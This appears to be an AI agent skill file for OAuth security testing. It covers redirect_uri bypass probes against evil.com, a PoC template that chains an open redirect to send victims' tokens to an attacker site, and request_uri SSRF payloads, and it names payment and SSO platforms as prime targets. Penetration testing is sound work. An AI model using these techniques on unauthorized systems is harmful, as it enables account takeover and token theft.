---
name: oauth-testing
description: "OAuth attack testing — redirect_uri validation bypass for authorization code theft, implicit flow token leakage, missing or replayable state enabling CSRF account linking, and dynamic client registration SSRF. Use when the target offers Login with Google/GitHub/Facebook or exposes /authorize, /oauth, or /connect endpoints, since redirect_uri bypass means mass account takeover."
---

# OAuth redirect_uri Bypass → Token Theft

## Crown Jewel Targets

- **Apps using OAuth for "Login with Google/GitHub/Facebook"** -- redirect_uri bypass = mass ATO on any user who clicks a crafted link
- **Payment platforms** (PayPal, Stripe OAuth) -- token theft = access to financial APIs and transaction history
- **Developer platforms** (GitHub, GitLab, Bitbucket) -- OAuth scopes often include repo:write, leading to supply chain attacks
- **Enterprise SSO via OIDC** (Okta, Auth0, Azure AD) -- single bypass = access to all connected SaaS apps
- **Mobile apps with OAuth callback schemes** -- custom URI scheme hijacking (e.g., `myapp://callback`) steals tokens without redirect_uri bypass
- **Apps with implicit flow** (`response_type=token`) -- token in URL fragment = trivially stolen via Referer or injected content

## Attack Surface Signals

- **URL patterns**: `/oauth/authorize`, `/auth/callback`, `/login/oauth/`, `/.well-known/openid-configuration`, `/oauth/token`, `/registration` (dynamic client)
- **Parameters**: `redirect_uri=`, `client_id=`, `response_type=`, `state=`, `scope=`, `code_challenge=`
- **JS indicators**: `client_id`, `authorizationUrl`, `tokenUrl`, `openid`, `scope:` in bundle configs
- **Headers**: `Location:` redirect with `code=` or `access_token=` in URL

## Detection
```bash
# Find OAuth authorize endpoints
curl -s TARGET | grep -E "oauth|authorize|client_id|redirect_uri" | head -20
# Check .well-known
curl -s TARGET/.well-known/openid-configuration 2>/dev/null | jq '.authorization_endpoint'
# Test redirect_uri validation bypass
curl -s "OAUTH_URL?redirect_uri=https://evil.com" -D- | grep -i "location"
curl -s "OAUTH_URL?redirect_uri=https://TARGET.evil.com" -D- | grep -i "location"
curl -s "OAUTH_URL?redirect_uri=https://TARGET.com.evil.com" -D- | grep -i "location"
curl -s "OAUTH_URL?redirect_uri=https://TARGET.com/../evil.com" -D- | grep -i "location"
```

**Positive indicators:**
- `redirect_uri` accepted with attacker-controlled subdomain or path
- `authorization_code` or `access_token` in redirect URL
- Implicit flow (`response_type=token`) sends token in URL fragment

## Exploitation
1. Map OAuth flow: authorization_endpoint, redirect_uri, response_type
2. Test redirect_uri bypass techniques:
   - Subdomain: `redirect_uri=https://TARGET.evil.com`
   - Path traversal: `redirect_uri=https://TARGET.com/oauth/../evil`
   - HPP: `redirect_uri=https://legit.com&redirect_uri=https://evil.com`
   - Regex bypass: `redirect_uri=https://TARGET.com.evil.com`
   - Open redirect chain: `redirect_uri=https://TARGET.com/redirect?url=https://evil.com`
3. If code flow: steal `code` → exchange for token at token endpoint
4. If implicit flow (`response_type=token`): token is in URL fragment (accessible via JS)

## PoC Template
```bash
# 1. Find open redirect on OAuth client domain
OPEN_REDIRECT="https://target.com/redirect?url=ATTACKER_CONTROLLED"
# 2. Chain into OAuth
OAUTH_URL="https://provider.com/oauth/authorize?response_type=token&client_id=CLIENT&redirect_uri=${OPEN_REDIRECT}"
# 3. Victim visits OAUTH_URL → token sent to attacker site
```

## Important Notes
- HPP (HTTP Parameter Pollution): some parsers use first, some use last `redirect_uri`
- `/../` traversal in redirect_uri works when server does string prefix match only
- Always test implicit flow (`response_type=token`) — token in fragment = steal via referrer or JS
- Open redirect on the target domain can be chained to bypass strict redirect_uri validation

## Reference Writeups
- [Bypass of redirect_uri validation with /../ in GitHub](http://homakov.blogspot.hk/2014/02/how-i-hacked-github-again.html?m=1) by Egor Homakov
- [Bypassing Digits web authentication's host validation with HPP](https://hackerone.com/reports/114169) by filedescriptor
- [Steal Google Oauth in Microsoft](http://blog.intothesymmetry.com/2015/06/on-oauth-token-hijacks-for-fun-and.html)
- [Bypassing callback_url validation on Digits](https://hackerone.com/reports/108113) by filedescriptor

## PortSwigger Academy — Advanced Techniques

- **Token leakage via Referer (no JS)**: HTML injection with `<img src="evil.com">` on whitelisted redirect page — token in Referer
- **Scope upgrade during code exchange**: Inject `scope=openid email profile` in POST to /token
- **Unverified email ATO**: Register at OAuth provider with victim's email (unverified) — client trusts provider
- **Dynamic client registration SSRF**: Unprotected `/registration` endpoint — set `logo_uri`, `jwks_uri` to attacker URLs
- **request_uri SSRF**: `?request_uri=https://attacker.com/payload.jwt` — provider fetches JWT
- **JWT-packaged parameter bypass**: Move `redirect_uri` into JWT referenced by `request_uri` — skip redirect validation

## Operator Notes (Battle-Tested)

1. **Playwright is mandatory for OAuth flow testing ()** -- OAuth involves multi-step redirects, cookie setting, and JavaScript execution. Never test with curl alone. Proxy Playwright through Burp to capture the full redirect chain.
2. **Always check `.well-known/openid-configuration` first** -- it reveals authorization_endpoint, token_endpoint, supported scopes, and response_types. This is your attack surface map for the entire OAuth implementation.
3. **Open redirect on target domain = OAuth bypass** -- even strict redirect_uri validation can be chained with an open redirect on an allowed path. Find the open redirect first, then plug it into `redirect_uri`. See `open-redirect`.
4. **HPP on redirect_uri is WAF-specific** -- some parsers use first, some use last. Test `redirect_uri=https://legit.com&redirect_uri=https://evil.com` on both the authorization server AND the client app.
5. **Dynamic client registration is often unprotected** -- `/registration` endpoint lets you register a new OAuth client with arbitrary `redirect_uris`, `logo_uri` (SSRF), and `jwks_uri` (SSRF). This is a separate finding class.

## Related Skills & Chains

| When | Go to |
|------|-------|
| SAML/SSO instead of OAuth | `auth-bypass-testing` → `references/saml-bypass-techniques.md` |
| Open redirect found on target | `open-redirect` |
| SSRF via dynamic client registration | `ssrf-testing` |
| State parameter missing (CSRF login) | `csrf-testing` |
| Token in DOM (JavaScript access) | `xss-testing` |
| Generic auth bypass needed | `auth-bypass-testing` |

## Reference files

Read these when the situation calls for the depth they carry — they are not loaded automatically.

- `references/oauth-client-id-hunting.md` — **oauth client id hunting** — related_patterns:
